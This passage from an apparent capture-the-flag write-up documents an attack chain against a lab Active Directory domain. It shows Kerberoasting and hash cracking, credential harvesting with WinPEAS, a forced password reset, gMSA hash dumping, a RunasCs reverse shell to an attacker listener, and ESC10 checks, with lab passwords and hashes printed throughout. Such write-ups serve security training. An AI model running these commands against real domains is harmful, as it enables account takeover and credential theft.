- `javier.mmarshall` - IT_Contractors (DISABLED - `userAccountControl: 66050`)
- `mark.bbond` - IT_Support (has certificates)
- `nathan.aadam` - IT_Admins (has SPN: HTTP/exchange.mirage.htb)
- `Mirage-Service$` - Group Managed Service Account (`gMSA`)


Found out that we can [kerberoast](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast) `nathan.aadam` account as we can see that it has `SPN: HTTP/exchange.mirage.htb`.
```bash
# nathan.aadam user object
servicePrincipalName: HTTP/exchange.mirage.htb
```

### Kerberoasting
Let's grab the ticket from `david.jjackson` account and then update the `KRB5CCNAME` environment variable.
```bash
└─$ getTGT.py mirage.htb/david.jjackson:'pN8kQmn6b86!1234@' -dc-ip 10.129.254.128         
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in david.jjackson.ccache

└─$ export KRB5CCNAME=david.jjackson.ccache
```

To make sure, we can double check with `klist` command.
```bash
└─$ klist
Ticket cache: FILE:david.jjackson.ccache
Default principal: david.jjackson@MIRAGE.HTB

Valid starting       Expires              Service principal
07/21/2025 12:31:18  07/21/2025 22:31:18  krbtgt/MIRAGE.HTB@MIRAGE.HTB
        renew until 07/22/2025 12:29:46
```

Let's perform kerberoasting.

```bash
└─$ impacket-GetUserSPNs 'mirage.htb/david.jjackson' -dc-host dc01.mirage.htb -k -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName      Name          MemberOf                                                             PasswordLastSet             LastLogon                   Delegation 
------------------------  ------------  -------------------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/exchange.mirage.htb  nathan.aadam  CN=Exchange_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb  2025-06-23 17:18:18.584667  2025-07-04 16:01:43.511763             



$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$ecead77d5b4c41fcd8e159049d95f5a0$5160f0ba7e6fae6853cdfaff39307619748c90316a85e6f3807893374160834db1fa3bc6714b37a1b6f421bed2c876b8b742ca4fcce87125b004698e5677a9a11764b0fa06f5cc6392d61e40a19317977427a1a1c830992e237763c391cc0175de39839e2975d3f730ecbf1f21d3479f8f6c9af85211cac10f1d86c6cf77db6f63995f5a5ed30640997d417ebd2512eb627f9e7fd4f0639bc71282088a634cbac8799983b76dd7f04d3dd376080b6c7a1bb261d153a1c0e2af272d68044d45d5084dc7cd3fd638dee7d851edb5319819e0e98616c4697db1e479b5d894d30b6fa22d44a93c79c180300b95a8c8ac21827e9e424ae2f994ceadf8ed7a6ef8cb1952b5d501e1cf2ed84860e8a466bda226ac5db705ca2026cf880a8bfd1e6d4157d0ee9441d8c30bcf29a3a622a3635e65af4e8f7e066e337944266e40705ca54ef2b0a57698d9965bb4ce39943246b9d629c3a36136667bcc280247ff1b970ca50cb8431f49cb32098a3f610ae252351715a535ab15cb9b10007ea410970be044bfd29e0847fc5038ec7223eda3873807cf206ef95d92e0dcb00328c6c713cafb4cd9fb4de38f60f04b6695807e11bcdc18da7eff5458601c124154ea5d5443316a1bb888bed29621c7c9ceca1e3169a87f6cf7d7387aa27d11d8c4a95aea7279a5cd2dbc83e726403a8bd85e8b70d447bd1bacef180e7cb1b6dfc767ff3cd6740c39fa672f576c10793f1073f9402f92f3f5916e8c3371b594c702cc7008d28cfa7d362adf5ee3af98330a122b1846e99b092a5bffe0d60a65c1102ccc4c1a8fd54fd337b7b535c3dad867918efbd9b458d9402e2435f1fcdc6df3e180fd4fdad4378acdca961fd7ff41329e55f42b38ea9f50d63478e177238a4504a3b8b639339310b6eb5f312ee25730192972ccca81d4f333ca5c91123d7a76552ad8f2108d2dd6353478696b772f583f1451788e8a8c28852c3ee5a57e5221b5eb1589468784651402f85fcd4e130db47afd4632e6fd17a0de656f6e0d77118a31f56d85bd5c48efa284917d92faffdfe23a28e8818875d623c958c4b88eda695882a399f6ccd8fc9208f44bcd5813fe5e87567a73f3befa2400c5969f79c5759299d00cfebc0ce151819a0ba658f9fe567111649e2edc0cc6de2f1a9cde0d0f127b2321bd6fff20a0f5adc974be2938067fdcf46ac5ed81cefae440c72429a3a41c7377e03b2425b9027eb5225f03afb2a90b0251d7e713a163b1cd784b8bd22ec769c948b7f6edd9da482c5b6a0c474b876137ffcd917e29a255a213487b6e6f3f285bf8e0bf0e83590007a5c619440ce92175d873a25bbcf8ddcb521bbb2721e6031a1f663ff82a03705faf907db98e5d04a7091f109657e6f78e4fda84058c5a78c0882338474c9375c3e730387d9fccfd20fe3683632c32621afcc6b0b20190cbb0507d09a6877fdd305e0655db823602f56f13d6b3068499563f6f9ed01bcde74db8e8d92362f2b618082839837b618a78285d443fc9fee0189ff5dd0f7d665c8892335f2313341f565056050f476640993a7a8fa006914205e0
```

Save it to `kerberoast_hashes.txt` file and then use `john` to crack the hashes.

```bash
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
3edc#EDC3        (?)     
1g 0:00:00:43 DONE (2025-07-21 12:33) 0.02308g/s 287906p/s 287906c/s 287906C/s 3er733..3ddfiebw
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```bash
└─$ john --show kerberoast_hashes.txt
?:3edc#EDC3

1 password hash cracked, 0 left
```

Got the password `3edc#EDC3` for `nathan.aadam` account. <br>
&rarr; Gonna verify it.

```bash
└─$ nxc smb dc01.mirage.htb -u nathan.aadam -p '3edc#EDC3' -d mirage.htb -k
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\nathan.aadam:3edc#EDC3
```

Good to go, let's get the `nathan.aadam` ticket and update the environment variable.

```bash
└─$ getTGT.py mirage.htb/nathan.aadam:'3edc#EDC3' -dc-ip 10.129.254.128          
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in nathan.aadam.ccache

└─$ export KRB5CCNAME=nathan.aadam.ccache
```

```powershell
└─$ evil-winrm -i dc01.mirage.htb -u nathan.aadam -r mirage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> dir
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> cd ..
*Evil-WinRM* PS C:\Users\nathan.aadam> cd Desktop
*Evil-WinRM* PS C:\Users\nathan.aadam\Desktop> dir


    Directory: C:\Users\nathan.aadam\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          7/4/2025   1:01 PM           2312 Microsoft Edge.lnk
-ar---         7/20/2025   1:59 PM             34 user.txt


*Evil-WinRM* PS C:\Users\nathan.aadam\Desktop> type user.txt
d978de7d3aca6cec084dda46a33aa41d
```

Grab the `user.txt` flag.

## Initial Access
After we get the access to `nathan.aadam` account, let's get some `bloodhound` to recon more.

### Bloodhound
```bash
└─$ bloodhound-python -u 'nathan.aadam' -p '3edc#EDC3' -d mirage.htb -c All -o bloodhound_results.json -ns 10.129.254.128 -k
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: mirage.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 12 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 21 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.mirage.htb
INFO: Done in 00M 42S
```

Now upload the `bloodhound_results.json*` file to `bloodhound` and start to analyze the data.

![mirage](/assets/img/mirage-htb-season8/mirage-htb-season8_bloodhound.png)

After a while of looking around, we found some interesting things. But basically, these information we get from `bloodhound` almost the same results we got from `ldapsearch`.

![mirage](/assets/img/mirage-htb-season8/mirage-htb-season8_bloodhound_1.png)

We can see that `nathan.aadam` is member of `IT_Admins` group and also member of `Remote Management Users` group so we can remote to `nathan.aadam` account.

![mirage](/assets/img/mirage-htb-season8/mirage-htb-season8_bloodhound_2.png)

For this, we see that `mark.bbond` is member of `IT_Support` group and has **ForceChangePassword** privilege over `javier.mmarshall` account. And we know that `javier.mmarshall` account is disabled so we can leverage this point to enable back the account and reset the password.

![mirage](/assets/img/mirage-htb-season8/mirage-htb-season8_bloodhound_3.png)

If we can enable `javier.mmarshall` account, we will have **ReadGMSAPassword** over `Mirage-Service$` account.

So we got some information about the domain, let's start by getting back the `javier.mmarshall` account.

If we check back the `ldapsearch` results, we can see these format.

```bash
# javier.mmarshall
logonHours:: AAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

```bash
# mark.bbond  
logonHours:: ////////////////////////////
```

Research and found out this [a-logonhours](https://learn.microsoft.com/en-us/windows/win32/adschema/a-logonhours) attribute.

### Logon Hours
So all the bits = 0 meaning that user **NO login allowed at any time!** and bits that are set to 1 means that 24/7 login allowed.

```powershell
*Evil-WinRM* PS C:\temp> $hours = Get-ADUser mark.bbond -Properties LogonHours | Select-Object -ExpandProperty LogonHours
[System.Convert]::ToString($hours[0], 2).PadLeft(8, '0')
11111111
*Evil-WinRM* PS C:\temp> Get-ADUser -Filter * -Properties LogonHours | Select-Object Name, LogonHours

Name             LogonHours
----             ----------
Administrator    {255, 255, 255, 255...}
Guest
krbtgt
Dev_Account_A    {255, 255, 255, 255...}
Dev_Account_B
david.jjackson
javier.mmarshall {0, 0, 0, 0...}
mark.bbond       {255, 255, 255, 255...}
nathan.aadam     {255, 255, 255, 255...}
svc_mirage
```

But the things is that we need to get `mark.bbond` to change the `logonHours` attribute of `javier.mmarshall` account. <br>
&rarr; After recon around in `nathan.aadam` session, we can not found any usefull stuffs to get `mark.bbond`. Let's try this dirty boy [PEASS](https://github.com/peass-ng/PEASS-ng) to look for more.

### WinPEAS
First download the `winPEASx64.exe` into our kali machine.

```bash
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250701-bdcab634/winPEASx64.exe
```

Then create a `temp` directory in `C:\` and upload the `winPEASx64.exe` into it.

```powershell
*Evil-WinRM* PS C:\> mkdir temp


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         7/21/2025   1:42 PM                temp
*Evil-WinRM* PS C:\temp> upload winPEASx64.exe
                                        
Info: Uploading /home/kali/HTB_Labs/DEPTHS_Season8/Mirage/winPEASx64.exe to C:\temp\winPEASx64.exe
                                        
Data: 13541376 bytes of 13541376 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\temp> .\winPEASx64.exe > winpeas_results.txt
*Evil-WinRM* PS C:\temp> download winpeas_results.txt
                                        
Info: Downloading C:\temp\winpeas_results.txt to winpeas_results.txt
                                        
Info: Download successful!
```

After checking, we got the password for `mark.bbond` account.

```bash
������������ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  MIRAGE
    DefaultUserName               :  mark.bbond
    DefaultPassword               :  1day@atime
```

We can verify it if it can still be used.

```bash
└─$ nxc smb dc01.mirage.htb -u mark.bbond -p '1day@atime' -d mirage.htb -k
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\mark.bbond:1day@atime
```

Now let's change the `javier.mmarshall` password.

### ForceChangePassword
```bash
└─$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u 'mark.bbond' -p '1day@atime' set password javier.mmarshall 'p@ssw4rd123'
[+] Password changed successfully!
```

> We can check out this [ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword) to get to know the `bloodyAD` command and how it works.

Now grab the ticket from `javier.mmarshall` account.

```bash
└─$ getTGT.py mirage.htb/javier.mmarshall:'p@ssw4rd123' -dc-ip 10.129.254.128                                                   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

Oh no, it's revoked. Aww, we forgot to enable `javier.mmarshall` account. <br>
&rarr; Let's use `mark.bbond` credentials in `nathan.aadam` session to enable `javier.mmarshall` account.

```powershell
*Evil-WinRM* PS C:\temp> $Password = ConvertTo-SecureString "1day@atime" -AsPlainText -Force
*Evil-WinRM* PS C:\temp> $Cred = New-Object System.Management.Automation.PSCredential ("MIRAGE\mark.bbond", $Password)
```

Now enable `javier.mmarshall` account.

```powershell
*Evil-WinRM* PS C:\temp> Enable-ADAccount -Identity javier.mmarshall -Credential $Cred
```

Now let's clone logon hours and verify that `javier.mmarshall` account is enabled.

```powershell
*Evil-WinRM* PS C:\temp> $logonhours = Get-ADUser mark.bbond -Properties LogonHours | Select-Object -ExpandProperty logonhours
[byte[]]$hours1 = $logonhours
*Evil-WinRM* PS C:\temp> Set-ADUser -Identity javier.mmarshall -Credential $Cred -Replace @{logonhours = $hours1}
*Evil-WinRM* PS C:\temp> Get-ADUser javier.mmarshall -Properties Enabled, LogonHours | Select-Object Name, Enabled, LogonHours

Name             Enabled LogonHours
----             ------- ----------
javier.mmarshall    True {255, 255, 255, 255...}
```

The account is enabled now, let's grab the ticket from `javier.mmarshall` account.

```bash
└─$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u 'mark.bbond' -p '1day@atime' set password javier.mmarshall 'p@ssw4rd123'
[+] Password changed successfully!
```

```bash
└─$ getTGT.py mirage.htb/javier.mmarshall:'p@ssw4rd123' -dc-ip 10.129.254.128
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in javier.mmarshall.ccache

└─$ export KRB5CCNAME=javier.mmarshall.ccache
```

Also there is other way to recon `javier.mmarshall` through `mark.bbond` account by using [RunasCs](https://github.com/antonioCoco/RunasCs).

Setup a listener on our kali machine.

```bash
└─$ rlwrap -cAr nc -lvnp 3333
listening on [any] 3333 ...
```

Run the `RunasCs` command.

```powershell
*Evil-WinRM* PS C:\temp> .\RunasCs.exe mark.bbond '1day@atime' cmd.exe -r 10.10.14.54:3333
[*] Warning: The logon for user 'mark.bbond' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-6919f0$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 1108 created in background.
```

```bash
└─$ rlwrap -cAr nc -lvnp 3333
listening on [any] 3333 ...
connect to [10.10.14.54] from (UNKNOWN) [10.129.254.128] 59425
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
mirage\mark.bbond
```

Got the shell and we are in `mark.bbond` account. We can check the `javier.mmarshall` properties with `Get-ADUser` command.

```powershell
PS C:\Windows\system32> Get-ADUser javier.mmarshall -Properties *


AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : True
CanonicalName                        : mirage.htb/Disabled/Users/javier.mmarshall
Certificates                         : {}
City                                 :
CN                                   : javier.mmarshall
codePage                             : 0
Company                              :
CompoundIdentitySupported            : {False}
Country                              :
countryCode                          : 0
Created                              : 5/2/2025 1:33:11 AM
createTimeStamp                      : 5/2/2025 1:33:11 AM
Deleted                              :
Department                           :
Description                          : Contoso Contractors
DisplayName                          : javier.mmarshall
DistinguishedName                    : CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
Division                             :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {5/22/2025 2:49:20 PM, 5/22/2025 2:45:45 PM, 5/22/2025 2:02:51 PM, 5/22/2025 1:08:07 PM...}
EmailAddress                         :
EmployeeID                           :
EmployeeNumber                       :
Enabled                              : False
Fax                                  :
GivenName                            : javier.mmarshall
HomeDirectory                        :
HomedirRequired                      : False
HomeDrive                            :
HomePage                             :
HomePhone                            :
Initials                             :
instanceType                         : 4
isDeleted                            :
KerberosEncryptionType               : {None}
LastBadPasswordAttempt               :
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 133926722371201785
LastLogonDate                        : 5/22/2025 2:45:29 PM
lastLogonTimestamp                   : 133924239295082185
LockedOut                            : False
logonCount                           : 13
logonHours                           : {0, 0, 0, 0...}
LogonWorkstations                    :
Manager                              :
MemberOf                             : {CN=IT_Contractors,OU=Groups,OU=Contractors,OU=IT_Staff,DC=mirage,DC=htb}
MNSLogonAccount                      : False
MobilePhone                          :
Modified                             : 5/25/2025 11:44:43 AM
modifyTimeStamp                      : 5/25/2025 11:44:43 AM
msDS-SupportedEncryptionTypes        : 0
msDS-User-Account-Control-Computed   : 0
Name                                 : javier.mmarshall
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Person,CN=Schema,CN=Configuration,DC=mirage,DC=htb
ObjectClass                          : user
ObjectGUID                           : c52e731b-30c1-439c-a6b9-0c2f804e5f08
objectSid                            : S-1-5-21-2127163471-3824721834-2568365109-1108
Office                               :
OfficePhone                          :
Organization                         :
OtherName                            :
PasswordExpired                      : False
PasswordLastSet                      : 5/25/2025 11:44:43 AM
PasswordNeverExpires                 : True
PasswordNotRequired                  : False
POBox                                :
PostalCode                           :
PrimaryGroup                         : CN=Domain Users,CN=Users,DC=mirage,DC=htb
primaryGroupID                       : 513
PrincipalsAllowedToDelegateToAccount : {}
ProfilePath                          :
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 133926722832178700
SamAccountName                       : javier.mmarshall
sAMAccountType                       : 805306368
ScriptPath                           :
sDRightsEffective                    : 0
ServicePrincipalNames                : {}
SID                                  : S-1-5-21-2127163471-3824721834-2568365109-1108
SIDHistory                           : {}
SmartcardLogonRequired               : False
State                                :
StreetAddress                        :
Surname                              :
Title                                :
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 66050
userCertificate                      : {}
UserPrincipalName                    : javier.mmarshall@mirage.htb
uSNChanged                           : 69841
uSNCreated                           : 24655
whenChanged                          : 5/25/2025 11:44:43 AM
whenCreated                          : 5/2/2025 1:33:11 AM
```

Now let's continue the path, we got `javier.mmarshall` account, this one can [readGMSAPassword](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword) over `Mirage-Service$` account.

### ReadGMSAPassword
Gonna use this [gMSADumper](https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py) to dump the password of `Mirage-Service$` account.

```bash
└─$ python3 gMSADumper.py -k -d mirage.htb -l dc01.mirage.htb
Users or groups who can read password for Mirage-Service$:
 > javier.mmarshall
Mirage-Service$:::305806d84f7c1be93a07aaf40f0c7866
Mirage-Service$:aes256-cts-hmac-sha1-96:80bada65a4f84fb9006013e332105db15ac6f07cb9987705e462d9491c0482ae
Mirage-Service$:aes128-cts-hmac-sha1-96:ff1d75e3a88082f3dffbb2b8e3ff17dd
```

Got the hash of `Mirage-Service$` account.

When got to this point, I got stuck for a while and I don't know how to continue. <br>
&rarr; I try to get from information from `mark.bbond` and `Mirage-Service$` account.

```bash
└─$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u 'mark.bbond' -p '1day@atime' get writable --detail                      

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=mirage,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
logonHours: WRITE
userAccountControl: WRITE

distinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
url: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
wWWHomePage: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE
```

```bash
└─$ bloodyAD --host dc01.mirage.htb -k -u 'Mirage-Service$' get writable --detail                                           

distinguishedName: CN=TPM Devices,DC=mirage,DC=htb
msTPM-InformationObject: CREATE_CHILD

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=mirage,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
manager: WRITE
mail: WRITE
msDS-HABSeniorityIndex: WRITE
msDS-PhoneticDisplayName: WRITE
msDS-PhoneticCompanyName: WRITE
msDS-PhoneticDepartment: WRITE
msDS-PhoneticLastName: WRITE
msDS-PhoneticFirstName: WRITE
msDS-SourceObjectDN: WRITE
msDS-AllowedToDelegateTo: WRITE
altSecurityIdentities: WRITE
servicePrincipalName: WRITE
userPrincipalName: WRITE
legacyExchangeDN: WRITE
otherMailbox: WRITE
showInAddressBook: WRITE
systemFlags: WRITE
division: WRITE
objectGUID: WRITE
name: WRITE
displayNamePrintable: WRITE
proxyAddresses: WRITE
company: WRITE
department: WRITE
co: WRITE
dn: WRITE
initials: WRITE
givenName: WRITE
description: WRITE
title: WRITE
ou: WRITE
o: WRITE
sn: WRITE
objectCategory: WRITE
cn: WRITE
objectClass: WRITE

distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msDS-HostServiceAccount: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE
```

> Remember to get the ticket from `Mirage-Service$` account and update the `KRB5CCNAME` environment variable.

From the `bloodyAD` results, we can notice there is `msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE` and if we check this [RBCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd), we can use this to impersonate `Mirage-Service$` account.

We also found out that:

```bash
# mark.bbond writable attributes:
altSecurityIdentities: WRITE        ← ESC10 KEY INDICATOR!
userCertificate: WRITE              ← Certificate storage
userSMIMECertificate: WRITE         ← S/MIME certificates

# Mirage-Service$ writable attributes:
altSecurityIdentities: WRITE        ← Can modify certificate mappings!
userPrincipalName: WRITE            ← Can change UPN
servicePrincipalName: WRITE         ← Can modify SPNs
```

The `altSecurityIdentities` attribute that control certificate-to-user mapping and this one is related to [ESC10](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication) privilege escalation.

## Privilege Escalation
We gonna leverage `ESC10` to escalate our privilege to `Administrator`.

### ESC10
When reading the wiki about `ESC10`, we see that it can not be directly detected by `Certipy` but they got some query so we can test it manually.

```powershell
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL"

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL
    EventLogging    REG_DWORD    0x1
    CertificateMappingMethods    REG_DWORD    0x4

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CipherSuites
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Hashes
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\KeyExchangeAlgorithms
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols
```

So we can see that `CertificateMappingMethods` is set to `4` which means that this machine is potentially vulnerable to `ESC10`. <br>
&rarr; This is SChannel Registry Analysis.

If we read the description, we can see there is a sentence said that *An important aspect of ESC10 is that Schannel's certificate mapping logic can operate independently of the "strong certificate binding" settings (StrongCertificateBindingEnforcement) primarily designed for Kerberos PKINIT authentication on DCs.* <br>
&rarr; Let's check out the `StrongCertificateBindingEnforcement` setting.

```powershell
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" | 
Select-Object StrongCertificateBindingEnforcement

StrongCertificateBindingEnforcement
-----------------------------------
                                  1
```

